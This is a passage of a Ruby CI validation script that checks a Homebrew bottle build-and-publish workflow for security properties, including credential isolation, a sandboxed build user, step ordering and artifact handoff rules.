        index_publication_download["if"] == "${{ !inputs.dry-run }}" &&
        index_publication_download["continue-on-error"] == true &&
        index_publication_download["with"] == {
          "name" => index_publication_name,
          "path" => "${{ runner.temp }}/homebrew-index-publication",
        }, "publisher version-index evidence download contract changed")
  publish_handoff_upload = named_step(verify_steps, "Upload validated publication handoff")
  check(publish_handoff_upload["uses"] == UPLOAD_ACTION && publish_handoff_upload["with"] == {
    "name" => publish_handoff_name,
    "path" => "${{ runner.temp }}/homebrew-publish-handoff",
    "compression-level" => 0,
    "if-no-files-found" => "error", "retention-days" => 2,
  }, "publisher publication handoff artifact contract changed")
  publish_handoff_download = named_step(finalize_steps, "Download validated publication handoff")
  check(publish_handoff_download["uses"] == DOWNLOAD_ACTION &&
        publish_handoff_download["id"] == "publish-handoff" &&
        publish_handoff_download["continue-on-error"] == true &&
        publish_handoff_download["with"] == {
          "name" => publish_handoff_name,
          "path" => "${{ runner.temp }}/homebrew-publish-handoff",
        }, "publisher publication handoff download contract changed")

  build_run = named_step(build_steps,
                         "Build and test Homebrew bottle without publisher credentials").fetch("run")
  check(build_run.include?("unprivileged bottle build received $secret_name") &&
        build_run.include?("scripts/homebrew-bottle-build.sh") &&
        build_run.include?('readlink -f "$HOMEBREW_BREW_FILE"') &&
        build_run.include?('"$HOMEBREW_BREW_FILE" --repository'),
        "publisher build phase no longer rejects credentials or uses the reviewed builder")
  [
    '/usr/bin/od -An -N32 -tx1 /dev/urandom', "/usr/bin/tr -d ' \\n'",
    '[[ "$workflow_command_token" =~ ^[0-9a-f]{64}$ ]]',
    "trap restore_workflow_commands_on_exit EXIT",
    "workflow_commands_stopped=1",
    "printf '::stop-commands::%s\\n' \"$workflow_command_token\"",
    "printf '::%s::\\n' \"$workflow_command_token\"",
    'status="$?"', 'exit "$status"', "resume_workflow_commands", "trap - EXIT",
  ].each do |fragment|
    check(build_run.include?(fragment), "publisher Formula output boundary lacks #{fragment}")
  end
  stop_commands_index = build_run.index("printf '::stop-commands::%s\\n'")
  builder_index = build_run.index("bash scripts/dev-shell.sh bash scripts/homebrew-bottle-build.sh")
  resume_commands_index = build_run.rindex("resume_workflow_commands")
  check(stop_commands_index && builder_index && resume_commands_index &&
        stop_commands_index < builder_index && builder_index < resume_commands_index,
        "publisher Formula output is not enclosed by the workflow-command boundary")
  check(!build_run.match?(/(?:export|readonly|declare\s+-x)\s+workflow_command_token/) &&
        !build_run.include?("GITHUB_ENV=$workflow_command_token") &&
        build_run.scan(/workflow_command_token/).length == 4,
        "publisher exports the workflow-command token to Formula execution")
  check(!values_for_key(workflow, "run").join("\n").include?("GITHUB_PATH"),
        "publisher exposes a writable Homebrew prefix through job PATH")
  identity_step = named_step(build_steps, "Create isolated Formula execution identity")
  check(identity_step.keys.sort == %w[id name run shell] &&
        identity_step["id"] == "formula-identity" && identity_step["shell"] == "bash",
        "publisher Formula execution identity mapping changed")
  identity_run = identity_step.fetch("run")
  [
    'build_user="kandelo-homebrew-build"',
    'sudo_bin="/usr/bin/sudo"',
    'systemd_run_bin="/usr/bin/systemd-run"',
    'systemctl_bin="/usr/bin/systemctl"',
    'getent_bin="/usr/bin/getent"',
    'pgrep_bin="/usr/bin/pgrep"',
    'pkill_bin="/usr/bin/pkill"',
    'useradd_bin="/usr/sbin/useradd"',
    'userdel_bin="/usr/sbin/userdel"',
    'sudo_mode="$(stat -c \'%a\' "$sudo_bin"',
    'stat -c \'%u\' "$sudo_bin"',
    '8#$sudo_mode & 0022',
    'pkill_target="$(readlink -f -- "$pkill_bin"',
    '"$sudo_bin" -n -- "$useradd_bin" --system --user-group --create-home',
    'echo "created=true" >> "$GITHUB_OUTPUT"',
    '[ "$(id -u "$build_user")" != "$(id -u)" ]',
    '"$sudo_bin" -n -u "$build_user" -- "$sudo_bin" -n true',
    'shared_temp="$(mktemp -d /tmp/kandelo-homebrew.XXXXXX)"',
    '"$sudo_bin" chmod 1777 "$shared_temp"',
    'echo "KANDELO_HOMEBREW_BUILD_USER=$build_user"',
    'echo "KANDELO_HOMEBREW_SHARED_TEMP=$shared_temp"',
    'echo "KANDELO_HOMEBREW_SUDO_BIN=$sudo_bin"',
    'echo "KANDELO_HOMEBREW_SYSTEMD_RUN_BIN=$systemd_run_bin"',
    'echo "KANDELO_HOMEBREW_SYSTEMCTL_BIN=$systemctl_bin"',
    'echo "KANDELO_HOMEBREW_GETENT_BIN=$getent_bin"',
    'echo "KANDELO_HOMEBREW_PGREP_BIN=$pgrep_bin"',
    'echo "KANDELO_HOMEBREW_PKILL_BIN=$pkill_bin"',
    "--expand-environment=",
    'echo "HOMEBREW_CACHE=$shared_temp/cache"',
    'echo "HOMEBREW_TEMP=$shared_temp/tmp"',
  ].each do |fragment|
    check(identity_run.include?(fragment),
          "publisher Formula execution identity lacks #{fragment}")
  end
  dev_shell = File.read(File.join(REPO_ROOT, "scripts/dev-shell.sh"))
  check(%w[
    KANDELO_HOMEBREW_BUILD_USER KANDELO_HOMEBREW_SHARED_TEMP
    KANDELO_HOMEBREW_SUDO_BIN KANDELO_HOMEBREW_SYSTEMD_RUN_BIN
    KANDELO_HOMEBREW_SYSTEMCTL_BIN KANDELO_HOMEBREW_GETENT_BIN
    KANDELO_HOMEBREW_PGREP_BIN
    KANDELO_HOMEBREW_PKILL_BIN
  ].all? { |name| dev_shell.include?("--keep #{name}") },
        "dev shell drops the isolated Formula build identity")
  check(%w[
    KANDELO_HOMEBREW_BUILD_ROOT KANDELO_HOMEBREW_RUNTIME_EVIDENCE
    KANDELO_HOMEBREW_BROWSER_EVIDENCE
  ].all? { |name| dev_shell.include?("--keep #{name}") },
        "dev shell drops exact Homebrew runtime evidence inputs")
  bottle_builder = File.read(File.join(REPO_ROOT, "scripts/homebrew-bottle-build.sh"))
  [
    'homebrew_patched_launcher_isolate "$BUILD_USER"',
    'homebrew_patched_launcher_teardown "$BUILD_USER"',
    "homebrew_patched_launcher_verify_isolation",
    'homebrew_assert_tree_not_writable_by_user "$BUILD_USER" "$OUT_DIR"',
    'homebrew_assert_tree_not_replaceable_by_user "$BUILD_USER" "$OUT_DIR"',
    "CI Formula execution requires KANDELO_HOMEBREW_BUILD_USER",
    'mktemp -d "$SHARED_TEMP/homebrew-build.XXXXXX"',
    'CONTROL_DIR="$(mktemp -d "$OUT_DIR/.control.XXXXXX")"',
    'chmod 0700 "$CONTROL_DIR"',
    'INSTALL_LOG="$CONTROL_DIR/brew-install.log"',
    'DEPENDENCY_LIST="$CONTROL_DIR/same-tap-dependencies.txt"',
    'BUILD_TEST_DEPENDENCY_LIST="$CONTROL_DIR/same-tap-build-test-dependencies.txt"',
    'DEPENDENCY_POUR_LIST="$CONTROL_DIR/same-tap-pour-dependencies.txt"',
    'log="$CONTROL_DIR/brew-install-attempt-${attempt}.log"',
    'rm -rf "$CONTROL_DIR"',
    'unset HOMEBREW_KANDELO_BOTTLE_TAG KANDELO_HOMEBREW_BOTTLE_TAG',
    'run_brew_for_kandelo_bottles()',
    'HOMEBREW_KANDELO_BOTTLE_TAG="$BOTTLE_TAG"',
    'KANDELO_HOMEBREW_BOTTLE_TAG="$BOTTLE_TAG"',
    'run_brew_logged run_brew_for_kandelo_bottles "$BREW_BIN" install',
    'run_brew_logged "$BREW_BIN" install',
    "--include-build --include-test",
    'validate_same_tap_dependency_list "$DEPENDENCY_LIST"',
    '"$BUILD_TEST_DEPENDENCY_LIST" "build/test dependency list"',
    'validate_same_tap_dependency_list "$DEPENDENCY_POUR_LIST"',
    'done <"$DEPENDENCY_POUR_LIST"',
    '--expected-dependencies "$DEPENDENCY_LIST"',
    "--only-dependencies",
    "--include-test",
    'run_brew_for_kandelo_bottles "$BREW_BIN" bottle',
  ].each do |fragment|
    check(bottle_builder.include?(fragment), "reviewed bottle builder lacks #{fragment}")
  end
  dependency_pour_index = bottle_builder.index(
    'run_brew_logged run_brew_for_kandelo_bottles "$BREW_BIN" install'
  )
  runtime_dependency_index = bottle_builder.index(
    'deps --topological --full-name --formula "$FORMULA_REF"'
  )
  build_test_dependency_index = bottle_builder.index(
    'deps --topological --full-name --include-build --include-test'
  )
  test_dependency_index = bottle_builder.index('run_brew_logged "$BREW_BIN" install')
  target_build_index = bottle_builder.index("brew_install_build_bottle")
  check(runtime_dependency_index && build_test_dependency_index && dependency_pour_index &&
        test_dependency_index && target_build_index &&
        runtime_dependency_index < build_test_dependency_index &&
        build_test_dependency_index < dependency_pour_index &&
        dependency_pour_index < test_dependency_index &&
        test_dependency_index < target_build_index,
        "reviewed bottle builder installs same-tap or host dependencies outside their phases")
  bottle_verifier = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-verify-poured-bottle.sh")
  )
  [
    'DEPENDENCY_LIST="$CONTROL_DIR/dependencies.txt"',
    'TEST_DEPENDENCY_LIST="$CONTROL_DIR/test-dependencies.txt"',
    'SAME_TAP_TEST_DEPENDENCY_LIST="$CONTROL_DIR/same-tap-test-dependencies.txt"',
    'HOST_DEPENDENCY_LIST="$CONTROL_DIR/host-dependencies.txt"',
    'DEPENDENCY_POUR_LIST="$CONTROL_DIR/pour-dependencies.txt"',
    "--include-test",
    'validate_dependency_list "$DEPENDENCY_LIST"',
    '"$SAME_TAP_TEST_DEPENDENCY_LIST" "test dependency list"',
    'validate_dependency_list "$DEPENDENCY_POUR_LIST"',
    'validate_dependency_list "$HOST_DEPENDENCY_LIST"',
    'done <"$DEPENDENCY_POUR_LIST"',
    'done <"$HOST_DEPENDENCY_LIST"',
    'unset HOMEBREW_KANDELO_BOTTLE_TAG KANDELO_HOMEBREW_BOTTLE_TAG',
    '--expected-dependencies "$DEPENDENCY_LIST"',
  ].each do |fragment|
    check(bottle_verifier.include?(fragment), "reviewed bottle verifier lacks #{fragment}")
  end
  check(!bottle_verifier.include?("--only-dependencies"),
        "reviewed bottle verifier reintroduced the target's pure build closure")
  verifier_runtime_dependency_index = bottle_verifier.index(
    'deps --topological --full-name --formula "$FORMULA_REF"'
  )
  verifier_test_dependency_index = bottle_verifier.index(
    'deps --topological --full-name --include-test'
  )
  verifier_dependency_pour_index = bottle_verifier.index(
    'run_brew_logged run_brew_for_kandelo_bottles "$BREW_BIN" install'
  )
  verifier_host_dependency_index = bottle_verifier.index(
    'run_brew_logged "$BREW_BIN" install'
  )
  verifier_cache_clear_index = bottle_verifier.index(
    'find "$HOMEBREW_CACHE" -mindepth 1 -delete'
  )
  verifier_target_install_index = bottle_verifier.index(
    'run_brew_logged run_brew_for_kandelo_bottles "$BREW_BIN" install',
    (verifier_dependency_pour_index || -1) + 1
  )
  verifier_formula_test_index = bottle_verifier.index(
    'run_brew_logged "$BREW_BIN" test "$FORMULA_REF"'
  )
  check(verifier_runtime_dependency_index && verifier_test_dependency_index &&
        verifier_dependency_pour_index && verifier_host_dependency_index &&
        verifier_cache_clear_index && verifier_target_install_index &&
        verifier_formula_test_index &&
        verifier_runtime_dependency_index < verifier_test_dependency_index &&
        verifier_test_dependency_index < verifier_dependency_pour_index &&
        verifier_dependency_pour_index < verifier_host_dependency_index &&
        verifier_host_dependency_index < verifier_cache_clear_index &&
        verifier_cache_clear_index < verifier_target_install_index &&
        verifier_target_install_index < verifier_formula_test_index,
        "reviewed bottle verifier installs test dependencies, target, or test out of order")
  check(!bottle_builder.include?('$WORK_DIR/brew-install'),
        "reviewed bottle builder writes runner control logs through the Formula work directory")
  check(!bottle_builder.match?(/brew[^\n]*bottle[^\n]*(?:--merge|--write)/),
        "reviewed bottle builder lets Formula execution rewrite tap source")
  launcher = File.read(File.join(REPO_ROOT, "scripts/homebrew-patched-launcher.sh"))
  [
    "systemd-run", "--wait", "--collect", "--pipe",
    "--property=KillMode=control-group", "--property=SendSIGKILL=yes",
    "--property=NoNewPrivileges=yes", "--expand-environment=no",
    '"--uid=$build_user"', '"--gid=$build_group"',
    'env_bin="$(command -v env)"',
    'printf \' --working-directory="$working_directory" -- %q -i\'',
    'printf \'bottle_tag_env=()\\n\'',
    'for variable in KANDELO_HOMEBREW_BOTTLE_TAG HOMEBREW_KANDELO_BOTTLE_TAG',
    'bottle_tag_env+=("%s=${%s}")',
    'printf \' "${bottle_tag_env[@]}" %q "$@"\\n\' "$protected_brew"',
    '"$sudo_bin" install -o root -g root -m 0555 "$wrapper_source" "$wrapper_path"',
    "-writable -print -quit", "! -readable -o ! -executable", "-prune",
    "homebrew_patched_launcher_uid_has_processes", "homebrew_patched_launcher_teardown",
    '"$HOMEBREW_PATCHED_SUDO_BIN" -n -- "$HOMEBREW_PATCHED_PGREP_BIN"',
    '-KILL -u "$HOMEBREW_PATCHED_BUILD_UID"',
    "could not inspect Formula build identity processes",
    "Formula build identity still owns live processes",
  ].each do |fragment|
    check(launcher.include?(fragment), "isolated Brew launcher lacks #{fragment}")
  end
  teardown_index = bottle_builder.index('homebrew_patched_launcher_teardown "$BUILD_USER"')
  artifact_index = bottle_builder.index("mapfile -t bottle_jsons")
  check(teardown_index && artifact_index && teardown_index < artifact_index,
        "reviewed bottle builder reads artifacts before Formula process teardown")
  runtime_step = named_step(build_steps, "Materialize shell-script runtime for Formula tests")
  check(runtime_step.keys.sort == %w[name run shell] && runtime_step["shell"] == "bash",
        "publisher Formula test runtime mapping changed")
  runtime_run = runtime_step.fetch("run")
  [
    "bash scripts/dev-shell.sh bash -c", 'host="$(rustc -vV | sed -n "s/^host: //p")"',
    "for package in dash coreutils grep sed", 'cargo run --release -p xtask --target "$host" --quiet --',
    "build-deps --arch wasm32", '--binaries-dir "$PWD/binaries"', '--fetch-only resolve "$package"',
  ].each do |fragment|
    check(runtime_run.include?(fragment), "publisher Formula test runtime lacks #{fragment}")
  end
  check_architecture_aware_sysroot_step(
    named_step(build_steps, "Build Kandelo sysroot"), "publisher build"
  )
  check_architecture_aware_sysroot_step(
    named_step(verify_steps, "Build Kandelo sysroot for sidecar evidence"),
    "publisher verifier"
  )
  kernel_step = named_step(build_steps, "Build Kandelo kernel")
  fork_instrument_step = named_step(build_steps, "Build fork-instrument host tool")
  check(fork_instrument_step.keys.sort == %w[name run shell] &&
        fork_instrument_step["shell"] == "bash" &&
        fork_instrument_step.fetch("run").include?("cd kandelo") &&
        fork_instrument_step.fetch("run").include?(
          "bash scripts/dev-shell.sh bash scripts/build-fork-instrument-tool.sh"
        ), "publisher does not build the reviewed fork-instrument host tool")
  javascript_step = named_step(build_steps, "Install JavaScript dependencies for formula tests")
  browser_fragments = [
    'cd "$GITHUB_WORKSPACE/kandelo"', "bash scripts/dev-shell.sh env",
    'KANDELO_HOMEBREW_SHARED_TEMP="$KANDELO_HOMEBREW_SHARED_TEMP"',
    'KANDELO_HOMEBREW_BUILD_USER="$KANDELO_HOMEBREW_BUILD_USER"',
    'KANDELO_HOMEBREW_SUDO_BIN="$KANDELO_HOMEBREW_SUDO_BIN"',
    'node_bin="$(command -v node)"', "/nix/store/*/bin/node",
    "Formula browser provisioning resolved an undeclared Node",
    "bash scripts/homebrew-provision-formula-browser.sh",
    '--shared-temp "$KANDELO_HOMEBREW_SHARED_TEMP"',
    '--build-user "$KANDELO_HOMEBREW_BUILD_USER"',
    '--sudo-bin "$KANDELO_HOMEBREW_SUDO_BIN"', '--node-bin "$node_bin"',
    '--browser-app "$PWD/apps/browser-demos"',
  ]
  check_browser_step = lambda do |steps, name, label|
    step = named_step(steps, name)
    check(step.keys.sort == %w[name run shell] && step["shell"] == "bash",
          "#{label} Formula browser runtime mapping changed")
    run = step.fetch("run")
    browser_fragments.each do |fragment|
      check(run.include?(fragment), "#{label} Formula browser runtime lacks #{fragment}")
    end
    dev_shell_index = run.index("bash scripts/dev-shell.sh env")
    node_resolution_index = run.index('node_bin="$(command -v node)"')
    check(dev_shell_index && node_resolution_index && dev_shell_index < node_resolution_index,
          "#{label} resolves Formula browser Node from the hosted runner PATH")
    step
  end
  browser_step = check_browser_step.call(
    build_steps, "Provision Formula browser runtime", "publisher build"
  )
  verify_browser_step = check_browser_step.call(
    verify_steps, "Provision Formula browser runtime for bottle verification",
    "publisher verifier"
  )
  browser_provisioner = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-provision-formula-browser.sh")
  )
  [
    'BROWSER_CACHE="$SHARED_TEMP/ms-playwright"',
    '[ -e "$BROWSER_CACHE" ] || [ -L "$BROWSER_CACHE" ]',
    'PLAYWRIGHT_BROWSERS_PATH="$BROWSER_CACHE"',
    'HOST_SYSTEM_PATH="$(dirname "$SUDO_BIN"):/usr/sbin:/usr/bin:/sbin:/bin"',
    'PATH="$PATH:$HOST_SYSTEM_PATH" PLAYWRIGHT_BROWSERS_PATH="$BROWSER_CACHE"',
    '"$NODE_BIN" "$PLAYWRIGHT_CLI" install chromium --with-deps',
    'requireFromBrowserApp("@playwright/test")',
    '"$SUDO_BIN" -n -- chown -R root:root "$BROWSER_CACHE"',
    '"$SUDO_BIN" -n -- chmod -R a-w "$BROWSER_CACHE"',
    '"$SUDO_BIN" -n -H -u "$BUILD_USER" --',
    'test -w "$BROWSER_CACHE" -o -w "$BROWSER_EXECUTABLE"',
    "Playwright Chromium escaped its cache",
  ].each do |fragment|
    check(browser_provisioner.include?(fragment),
          "reviewed Formula browser provisioner lacks #{fragment}")
  end
  verifier_identity_step = named_step(
    verify_steps, "Create isolated bottle verification identity"
  )
  force_pour_step = named_step(
    verify_steps, "Force-pour and test the exact selected bottle without credentials"
  )
  verifier_retirement_step = named_step(
    verify_steps, "Retire isolated bottle verification identity"
  )
  check(verify_steps.index(verifier_identity_step) < verify_steps.index(verify_browser_step) &&
        verify_steps.index(verify_browser_step) < verify_steps.index(force_pour_step) &&
        verify_steps.index(force_pour_step) < verify_steps.index(verifier_retirement_step),
        "publisher provisions or uses the verifier browser outside the isolated test phase")
  build_formula_step = named_step(build_steps,
                                  "Build and test Homebrew bottle without publisher credentials")
  retire_identity_step = named_step(build_steps, "Retire isolated Formula execution identity")
  check(retire_identity_step.keys.sort == %w[if name run shell] &&
        retire_identity_step["if"] ==
          "${{ always() && steps.formula-identity.outputs.created == 'true' }}" &&
        retire_identity_step["shell"] == "bash",
        "publisher Formula execution identity retirement mapping changed")
  retire_identity_run = retire_identity_step.fetch("run")
  [
    '"$sudo_bin" -n -- "$pgrep_bin" -u "$build_uid"',
    '"$sudo_bin" -n -- "$pkill_bin" -KILL -u "$build_uid"',
    '"$sudo_bin" -n -- "$userdel_bin" -r "$build_user"',
    "could not inspect Formula build identity processes",
    "Formula build identity still exists after retirement",
  ].each do |fragment|
    check(retire_identity_run.include?(fragment),
          "publisher Formula execution identity retirement lacks #{fragment}")
  end
  postbuild_kandelo_step = named_step(
    build_steps, "Checkout exact post-build Kandelo validator source"
  )
  postbuild_tap_step = named_step(build_steps, "Checkout exact post-build tap source")
  source_closure_step = named_step(build_steps,
                                   "Recheck reviewed sources after Formula execution")
  source_closure_run = source_closure_step.fetch("run")
  [
    "scripts/homebrew-validate-formula-source-closure.sh",
    'cd "$GITHUB_WORKSPACE/kandelo-postbuild"',
    'git -C "$GITHUB_WORKSPACE/kandelo-postbuild" rev-parse HEAD',
    'git -C "$GITHUB_WORKSPACE/tap-reviewed" rev-parse HEAD',
    '--tap-root "$GITHUB_WORKSPACE/tap"', '--tap-repository "$TAP_REPOSITORY"',
    '--formula "$FORMULA"', '--base-ref "$TAP_SHA"',
    '--reviewed-tap-root "$GITHUB_WORKSPACE/tap-reviewed"',
  ].each do |fragment|
    check(source_closure_run.include?(fragment),
          "publisher Formula source-closure check lacks #{fragment}")
  end
  check(build_steps.index(kernel_step) < build_steps.index(fork_instrument_step) &&
        build_steps.index(fork_instrument_step) < build_steps.index(runtime_step) &&
        build_steps.index(runtime_step) < build_steps.index(javascript_step) &&
        build_steps.index(javascript_step) < build_steps.index(identity_step) &&
        build_steps.index(identity_step) < build_steps.index(browser_step) &&
        build_steps.index(browser_step) < build_steps.index(build_formula_step) &&
        build_steps.index(runtime_step) < build_steps.index(build_formula_step) &&
        build_steps.index(build_formula_step) < build_steps.index(retire_identity_step) &&
        build_steps.index(retire_identity_step) < build_steps.index(postbuild_kandelo_step) &&
        build_steps.index(retire_identity_step) < build_steps.index(postbuild_tap_step) &&
        build_steps.index(postbuild_kandelo_step) < build_steps.index(source_closure_step) &&
        build_steps.index(postbuild_tap_step) < build_steps.index(source_closure_step) &&
        build_steps.index(build_formula_step) < build_steps.index(source_closure_step),
        "publisher Formula test runtime is materialized outside the unprivileged pre-test phase")
  create_handoff_run = named_step(build_steps, "Create strict bottle data handoff").fetch("run")
  check(build_steps.index(source_closure_step) <
        build_steps.index(named_step(build_steps, "Create strict bottle data handoff")),
        "publisher creates the bottle handoff before revalidating Formula sources")
  [
    'cd "$GITHUB_WORKSPACE/kandelo-postbuild"',
    "scripts/homebrew-create-build-handoff.sh", '--tap-repository "$KANDELO_HOMEBREW_TAP_REPOSITORY"',
    '--bottle "$BOTTLE_ARCHIVE"', '--bottle-json "$BOTTLE_JSON"',
    '--dependency-provenance "$DEPENDENCY_PROVENANCE"',
    '--out "$RUNNER_TEMP/homebrew-build-handoff"',
  ].each do |fragment|
    check(create_handoff_run.include?(fragment), "publisher build handoff lacks #{fragment}")
  end
  check_forbidden_root_args(create_handoff_run, "publisher build handoff", [
    '--forbidden-root "$GITHUB_WORKSPACE"',
    '--forbidden-root "$(dirname "$GITHUB_WORKSPACE")"',
    '--forbidden-root "$RUNNER_TEMP"',
    '--forbidden-root "$KANDELO_HOMEBREW_SHARED_TEMP"',
    '--forbidden-root "$HOMEBREW_TEMP"',
    '--forbidden-root "/home/$KANDELO_HOMEBREW_BUILD_USER"',
  ])
  compose_child = named_step(
    build_steps, "Compose deterministic Homebrew OCI child without credentials"
  )
  compose_child_run = compose_child.fetch("run")
  [
    "credential-free OCI composer received $secret_name",
    "scripts/homebrew-validate-build-handoff.sh",
    "scripts/homebrew-oci-layout.py build-child",
    '--tap-root "$GITHUB_WORKSPACE/tap-reviewed"',
    '--kandelo-root "$GITHUB_WORKSPACE/kandelo-postbuild"',
    '--out-layout "$artifact/layout"', '--out-receipt "$artifact/receipt.json"',
  ].each do |fragment|
    check(compose_child_run.include?(fragment),
          "publisher deterministic OCI child composition lacks #{fragment}")
  end
  check_forbidden_root_args(compose_child_run, "publisher OCI child composition", [
    '--forbidden-root "$GITHUB_WORKSPACE"',
    '--forbidden-root "$(dirname "$GITHUB_WORKSPACE")"',
    '--forbidden-root "$RUNNER_TEMP"',
    '--forbidden-root "/home/kandelo-homebrew-build"',
  ])
  check(build_steps.index(source_closure_step) < build_steps.index(compose_child) &&
        build_steps.index(named_step(build_steps, "Create strict bottle data handoff")) <
          build_steps.index(compose_child) &&
        build_steps.index(compose_child) <
          build_steps.index(named_step(build_steps, "Upload deterministic Homebrew OCI child")),
        "publisher composes or exports the OCI child outside the reviewed data phase")

  upload_validate = named_step(upload_steps,
                               "Validate build data before exposing upload credentials")
  upload_attempt = named_step(upload_steps, "Upload validated bottle in isolated ORAS auth state")
  check(upload_validate["id"] == "validate-build" &&
        upload_attempt["if"] == "${{ steps.validate-build.outcome == 'success' }}" &&
        upload_steps.index(upload_validate) < upload_steps.index(upload_attempt),
        "publisher exposes upload credentials before validating the handoff")
  check(upload_validate.fetch("run").include?("scripts/homebrew-validate-build-handoff.sh") &&
        upload_validate.fetch("run").include?('--tap-repository "$KANDELO_HOMEBREW_TAP_REPOSITORY"') &&
        upload_attempt.fetch("run").include?("scripts/homebrew-ghcr-upload.sh") &&
        upload_attempt.fetch("run").include?('--out-json "$RUNNER_TEMP/homebrew-upload-receipt/receipt.json"'),
        "publisher isolated upload path changed")
  trusted_runner_roots = [
    '--forbidden-root "$GITHUB_WORKSPACE"',
    '--forbidden-root "$(dirname "$GITHUB_WORKSPACE")"',
    '--forbidden-root "$RUNNER_TEMP"',
    '--forbidden-root "/home/kandelo-homebrew-build"',
  ]
  check_forbidden_root_args(upload_validate.fetch("run"),
                            "publisher uploader handoff validation", trusted_runner_roots)
  upload_receipt_validation = named_step(upload_steps, "Revalidate upload receipt as data")
  check_forbidden_root_args(upload_receipt_validation.fetch("run"),
                            "publisher uploader receipt validation", trusted_runner_roots)
  build_handoff_validator = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-validate-build-handoff.sh")
  )
  inspector_call = 'python3 "$SCRIPT_ROOT/homebrew-inspect-bottle.py"'
  output_start = 'if [ -n "$OUT_BOTTLE_JSON" ]; then'
  check(build_handoff_validator.include?(inspector_call) &&
        build_handoff_validator.include?('--expected-abi "$EXPECTED_ABI"') &&
        build_handoff_validator.include?('--expected-arch "$ARCH"') &&
        build_handoff_validator.include?('inspection_args+=(--forbidden-root "$forbidden_root")') &&
        build_handoff_validator.index(inspector_call) < build_handoff_validator.index(output_start),
        "publisher handoff validation does not inspect bottle archives before producing uploader data")
  check(upload_steps.none? { |step| step["name"].to_s.downcase.include?("diagnostic") } &&
        upload_steps.count { |step| step["uses"] == UPLOAD_ACTION } == 1,
        "credentialed uploader publishes diagnostics")

  index_validate = named_step(
    index_steps, "Validate child layouts and public publication evidence without credentials"
  )
  index_import = named_step(
    index_steps, "Import the existing public Homebrew version index anonymously"
  )
  index_compose = named_step(
    index_steps, "Compose one complete Homebrew version index without credentials"
  )
  index_publish = named_step(
    index_steps, "Publish the complete Homebrew version index in isolated ORAS auth state"
  )
  index_validate_run = index_validate.fetch("run")
  [
    "credential-free index input validator received $secret_name",
    "scripts/homebrew-oci-layout.py validate-child",
    "validate-publication-receipt", '--kind child',
    'printf \'%s\\0%s\\0\'',
  ].each do |fragment|
    check(index_validate_run.include?(fragment),
          "publisher version-index input validation lacks #{fragment}")
  end
  index_import_run = index_import.fetch("run")
  [
    "anonymous index import received $secret_name",
    "scripts/homebrew-oci-layout.py import-public-index",
    '--remote "$remote"', '--reference "$top_ref"',
    '--registry-config "$anonymous_config"', '--out-layout "$existing"',
    '--out-result "$result"',
    'keys == ["digest", "layout", "schema", "status"]',
    'keys == ["schema", "status"]',
  ].each do |fragment|
    check(index_import_run.include?(fragment),
          "publisher anonymous version-index import lacks #{fragment}")
  end
  check((credential_names & index_import_run.scan(/[A-Z][A-Z0-9_]+/)).all? do |name|
    index_import_run.include?("-u #{name}") || index_import_run.include?("$secret_name")
  end, "publisher anonymous version-index import references an available credential")
  index_import_tool = File.read(File.join(REPO_ROOT, "scripts/homebrew-oci-layout.py"))
  [
    'commands.add_parser("import-public-index")',
    'target=f"{remote}:{reference}"',
    'descriptor=True',
    'target=f"{remote}@sha256:{digest}"',
    'MAX_BOTTLE_BYTES',
    'run_bounded_command(',
    '"oras", "blob", "fetch", "--descriptor"',
    'resolve_remote_blob_descriptor(',
    'f"{remote}@sha256:{top_digest}"',
    '"--to-oci-layout"',
    'digest-pinned imported layout does not match the validated top descriptor',
  ].each do |fragment|
    check(index_import_tool.include?(fragment),
          "trusted anonymous version-index importer lacks #{fragment}")
  end
  publication_limits = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-publication-limits.sh")
  )
  bottle_inspector = File.read(
    File.join(REPO_ROOT, "scripts/homebrew-inspect-bottle.py")
  )
  check(publication_limits.include?("readonly HOMEBREW_MAX_BOTTLE_BYTES=2147483648") &&
        publication_limits.include?(
          "readonly HOMEBREW_MAX_EXPANDED_BOTTLE_BYTES=17179869184"
        ) &&
        index_import_tool.include?('MAX_EXPANDED_BOTTLE_BYTES') &&
        index_import_tool.include?('publication_limits()') &&
        bottle_inspector.include?('publication_archive_limits()') &&
        bottle_inspector.include?('"$HOMEBREW_MAX_BOTTLE_BYTES"') &&
        bottle_inspector.include?('"$HOMEBREW_MAX_EXPANDED_BOTTLE_BYTES"') &&
        !bottle_inspector.include?('MAX_COMPRESSED_BYTES = 2 * 1024') &&
        !bottle_inspector.include?('MAX_ARCHIVE_BYTES = 16 * 1024'),
        "trusted OCI tooling does not use separate shared compressed and expanded limits")
  index_compose_run = index_compose.fetch("run")
  [
    "credential-free index composer received $secret_name",
    'args+=(--child-layout "$layout" --child-receipt "$receipt")',
    'args+=(--existing-layout "$existing")',
    "scripts/homebrew-oci-layout.py merge-index",
    '--out-layout "$RUNNER_TEMP/homebrew-complete-index/layout"',
    '--out-receipt "$RUNNER_TEMP/homebrew-complete-index/layout-receipt.json"',
  ].each do |fragment|
    check(index_compose_run.include?(fragment),
          "publisher complete version-index composition lacks #{fragment}")
  end
  index_publish_run = index_publish.fetch("run")
  [
    "scripts/homebrew-ghcr-upload.sh",
    '--layout "$RUNNER_TEMP/homebrew-complete-index/layout"',
    '--layout-receipt "$RUNNER_TEMP/homebrew-complete-index/layout-receipt.json"',
    '--out-json "$RUNNER_TEMP/homebrew-complete-index/transport-receipt.json"',
  ].each do |fragment|
    check(index_publish_run.include?(fragment),
          "publisher isolated version-index transport lacks #{fragment}")
  end
  check(index_steps.index(index_validate) < index_steps.index(index_import) &&
        index_steps.index(index_import) < index_steps.index(index_compose) &&
        index_steps.index(index_compose) < index_steps.index(index_publish) &&
        index_steps.index(index_publish) < index_steps.index(index_publication_upload),
        "publisher version-index validation, aggregation, transport, or evidence order changed")
  check(index_steps.none? { |step| step["name"].to_s.downcase.include?("diagnostic") } &&
        index_steps.count { |step| step["uses"] == UPLOAD_ACTION } == 1,
        "credentialed version-index publisher publishes diagnostics")

  privileged_runs = [upload_steps, index_steps].flatten.filter_map { |step| step["run"] }.join("\n")
  %w[
    homebrew-bottle-build.sh homebrew-formula-source-digest.rb
    homebrew-validate-formula-source-closure.sh
  ].each do |forbidden|
    check(!privileged_runs.include?(forbidden),
          "packages:write phase can execute Formula-controlled source through #{forbidden}")
  end
  check(!privileged_runs.match?(/(?:^|[[:space:]])ruby(?:[[:space:]]|$)/),
        "packages:write phase executes Ruby")

  canonical_build = named_step(verify_steps,
                               "Validate build handoff and reconstruct canonical bottle JSON").fetch("run")
